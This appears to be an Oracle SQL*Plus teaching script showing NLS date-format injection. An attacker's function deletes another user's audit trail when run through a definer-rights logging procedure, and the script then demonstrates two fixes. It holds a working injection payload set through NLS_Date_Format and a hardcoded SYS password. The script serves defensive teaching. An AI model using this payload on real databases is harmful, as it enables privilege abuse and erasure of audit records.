rem nls.sql
rem
rem (c) 2009 Oracle Corporation
rem
rem Author: Bridesmaid
rem
rem Illustration of an NLS Injection
rem

rem Connect as SYS to create our test environment

set echo on

--connect sys as sysdba

drop user auditor cascade;
drop user eviluser cascade;

create user auditor identified by auditor;
create user eviluser identified by eviluser;

grant connect, resource to auditor;
grant connect, resource to eviluser;


rem Now connect as our "victim" user.

connect auditor/auditor

rem Create the audit trail. We'll use a table for this
rem example to keep it simple. In real life we'd probably
rem be writing to a file or sending an alert somewhere.

create table myaudit(msg varchar2(2000));

rem Create a simple routine to write to the audit trail
rem This has no user input - so should be safe from injection?

create or replace procedure ping authid definer as

begin
	-- a common requirement in logging routines is
	-- to include a timestamp - so we have one too.
	execute immediate 'insert into myaudit values
	(''['||sysdate||'] - Ping!'')';
end;
/
show errors

rem Test that it works

exec ping;

select * from myaudit;

rem Now grant some rights to others

grant execute on ping to public;
grant select on myaudit to public;


rem Now connect as our evil user

connect eviluser/eviluser
set serveroutput on;

rem First, check that we can call the audit routines

exec auditor.ping;
select * from auditor.myaudit;


rem now create our evil function

create or replace function evil return varchar2 authid current_user is

begin
	declare
	begin
		execute immediate 'delete from auditor.myaudit';
	exception
		when others then null;
	end;
	return 'x';
end;
/
show errors
grant execute on evil to public;

rem Now try and get our evil function executed by auditor

alter session set NLS_Date_Format = '"1''||eviluser.evil||''1"';

rem We should see our evil routine running as auditor, and delete the audit trail
exec auditor.ping;

rem See that the audit trail is now bogus
select * from auditor.myaudit;

rem Lets try a fix


connect auditor/auditor

rem delete from the audit trail

delete from myaudit;

rem try a fixed routine. This time we can tidy the code to avoid the execute
rem immediate. This should fix the injection because the literal will
rem now be handled as a bind argument in the generated statement.

create or replace procedure ping authid definer as

begin
	insert into myaudit values('['||sysdate||'] - Ping!');
end;
/
show errors

rem test it

exec ping;


rem let's try the attack again

connect eviluser/eviluser
set serveroutput on;

alter session set NLS_Date_Format =
 '"1''||eviluser.evil||''1"';

rem try and execute our routine
exec auditor.ping;

rem And we can see that the routine is not called.
select * from auditor.myaudit;

rem Hold on though. We still have a bogos value for the timestamp. An
rem attacker can still generate bogus audit records...

alter session set NLS_Date_Format = '"30-Feb-01"';

exec auditor.ping;
select * from auditor.myaudit;

rem So lets try the fix again again...

connect auditor/auditor

rem First clear out the old audit records

delete from myaudit;

rem This time we will add an explicit format conversion

create or replace procedure ping authid definer as

  	-- Choose precision according to purpose.
  	Fmt constant varchar2(32767) := 'J dd-mon-yyyy hh24:mi:ss';
  	
  	-- Now generate our timestamp
  	Safe_Timestamp constant varchar2(32767) :=
    		To_Char(sysdate, Fmt);

begin
	insert into myaudit values('['||Safe_Timestamp||'] - Ping!');
end;
/
show errors

rem and test the routine works

exec ping;

rem let's try the attack again

connect eviluser/eviluser
set serveroutput on;

alter session set NLS_Date_Format = '"1''||eviluser.evil||''1"';

rem try and execute our routine
exec auditor.ping;

rem And we can see that the routine is not called.
select * from auditor.myaudit;

rem Now try a bogus time stamp

alter session set NLS_Date_Format = '"30-Feb-01"';

exec auditor.ping;

rem We can see the timestamp is preserved
select * from auditor.myaudit;

rem Tidy up

connect sys/BrightEyes as sysdba

drop user auditor cascade;
drop user eviluser cascade;
